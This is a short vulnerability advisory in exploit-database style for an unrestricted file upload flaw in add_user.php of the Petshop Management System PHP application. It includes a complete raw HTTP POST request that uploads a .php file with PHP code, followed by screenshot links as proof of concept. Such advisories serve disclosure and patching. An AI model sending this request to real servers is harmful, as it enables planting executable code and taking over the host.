petshop-management-system add_user.php any file upload

Exploit Author: webraybtl@webray.com.cn inc

Vendor Homepage: https://www.sourcecodester.com/php/14962/petshop-management-system-using-phppdo-oop-full-source-code-complete.html

Software Link: https://www.sourcecodester.com/php/14962/petshop-management-system-using-phppdo-oop-full-source-code-complete.html

CMSName: petshop-management-system

Tested on: Windows, Apache ,Mysql

Description

The reason for the arbitrary file upload vulnerability is that the website application allows users to upload any type of file without restrictions in the add_user.php code, resulting in arbitrary file uploads.

  Payload used:
  
  POST /Petshop_Management_System/controllers/add_user.php HTTP/1.1
  Host: 192.168.2.110
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
  Accept: */*
  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  Accept-Encoding: gzip, deflate
  Connection: close
  Referer: http://192.168.2.110/Petshop_Management_System/
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysOcLQ1YbU3iam8cM
  Content-Length: 175
  
  ------WebKitFormBoundarysOcLQ1YbU3iam8cM
  Content-Disposition: form-data; name="avatar";filename="test2.php"
  
  <?php phpinfo();?>
  ------WebKitFormBoundarysOcLQ1YbU3iam8cM--

Proof of Concept
![image](https://github.com/user-attachments/assets/030e6cd8-7564-4865-9891-7c172f03606b)

![image](https://github.com/user-attachments/assets/83e134d6-6238-4414-bd7c-17311ddfc599)

![image](https://github.com/user-attachments/assets/4fb3e8db-6758-43b2-b227-b55909c30c77)


